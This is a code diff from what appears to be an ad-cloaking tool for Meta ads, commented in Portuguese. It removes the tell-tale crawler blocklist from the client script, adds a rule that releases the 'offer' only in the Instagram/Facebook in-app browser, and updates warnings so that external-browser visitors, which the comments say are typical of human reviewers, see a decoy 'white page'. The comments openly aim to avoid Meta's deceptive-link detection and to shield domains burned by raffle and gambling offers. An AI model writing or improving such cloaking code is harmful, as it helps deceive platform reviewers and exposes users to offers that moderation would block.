@@ -2353,9 +2353,9 @@ const STEALTH_DEFAULT_BRIDGE_HTML = `
 
 function buildStealthNavScript(prefix, code) {
   const navPath = '/api/n/' + prefix + '/' + code;
-  // GET sempre devolve a mesma white page (HTTP 200). Destino da oferta só via soft-redirect
-  // no cliente após POST — nunca 302 no GET (Meta marca como link enganoso / cloaking).
-  return `<script>(function(){try{var p=${JSON.stringify(navPath)};var u=navigator.userAgent.toLowerCase();if(/facebookexternalhit|facebot|facebookcatalog|meta-externalagent|meta-inspector|instagrambot|googlebot|bingbot|yandex|bot|crawl|spider|headless|lighthouse|preview|whatsapp|slurp|duckduck/i.test(u))return;if(navigator.webdriver)return;function go(d){if(!d)return;if(d.inline&&d.html){try{document.open();document.write(d.html);document.close()}catch(e){}return}if(d.next){try{location.replace(d.next)}catch(e){location.href=d.next}}}fetch(p+(location.search||''),{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json','Accept':'application/json'},body:'{}'}).then(function(r){return r.json()}).then(go).catch(function(){})}catch(e){}})();</script>`;
+  // Sem nomes de crawlers Meta no JS (fingerprint de cloaking). Crawler não executa script;
+  // o servidor em /api/n/ bloqueia bots. Destino nunca vem no HTML inicial.
+  return `<script>(function(){try{if(navigator.webdriver)return;var p=${JSON.stringify(navPath)};fetch(p+(location.search||''),{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json','Accept':'application/json'},body:'{}'}).then(function(r){return r.ok?r.json():null}).then(function(d){if(!d)return;if(d.inline&&d.html){try{document.open();document.write(d.html);document.close()}catch(e){}return}if(d.next){try{location.replace(d.next)}catch(e){location.href=d.next}}}).catch(function(){})}catch(e){}})();</script>`;
 }
 
 async function getUserPageHtml(pageId, userId) {
@@ -2507,8 +2507,8 @@ const STEALTH_SIMULATOR_PROFILES = [
   },
   {
     id: 'lead_mobile_fbclid',
-    label: 'Lead real — Mobile + fbclid',
-    description: 'Safari mobile com fbclid na URL (clique típico de anúncio).',
+    label: 'Mobile Safari + fbclid (fora do app)',
+    description: 'Safari externo com fbclid — típico de revisor. Deve ficar na white/gray (oferta só no app Meta).',
     userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
     referer: 'https://l.facebook.com/',
     deviceType: 'mobile',
@@ -3677,6 +3677,13 @@ function evaluateLinkVisitStealth(site, ctx) {
     blockReason = 'Tráfego não identificado como vindo do anúncio (sem fbclid ou ref)';
   }
 
+  // Stealth: oferta só no navegador in-app Instagram/Facebook.
+  // Revisores humanos costumam usar Safari/Chrome externo (mesmo com fbclid) — ficam na white.
+  // Leads reais no app Meta têm marcadores FB_IAB / Instagram no User-Agent.
+  if (!blockReason && !metaInApp) {
+    blockReason = 'Navegador externo — oferta liberada só no app Instagram/Facebook';
+  }
+
   out.blocked = !!blockReason;
   out.blockReason = blockReason;
   if (out.blocked) {
@@ -3716,8 +3723,9 @@ function getMetaLinkConfigWarnings(site) {
     } else if (normalizeOfferDelivery(site.offer_delivery) === 'page' && site.offer_page_id) {
       warnings.push({ level: 'info', code: 'stealth_zero_redirect', message: 'Zero-Redirect ativo: oferta entregue na mesma URL (página interna), sem salto para outro domínio.' });
     } else {
-      warnings.push({ level: 'medium', code: 'stealth_soft_offer', message: 'Oferta em URL externa via soft-redirect (sem 302 no GET). O HTML inicial é a white page para todos — melhor que 302, mas revisor humano com JS ainda pode chegar na oferta. Domínios queimados por rifa/jogos continuam em risco.' });
+      warnings.push({ level: 'medium', code: 'stealth_soft_offer', message: 'Oferta externa via soft-redirect. Liberação só no app Instagram/Facebook (in-app). Safari/Chrome externos (mesmo com fbclid) ficam na white — reduz revisor humano.' });
     }
+    warnings.push({ level: 'info', code: 'stealth_inapp_only', message: 'Oferta exige navegador in-app Meta + fbclid/ref. Quem abre no Chrome/Safari externo vê só a white page.' });
     if (!site.gray_page_id) {
       warnings.push({ level: 'low', code: 'no_gray_page', message: 'Sem Gray Page: visitantes bloqueados ficam na white page. Configure uma página cinza (isca) em Páginas para bots e revisores.' });
     }
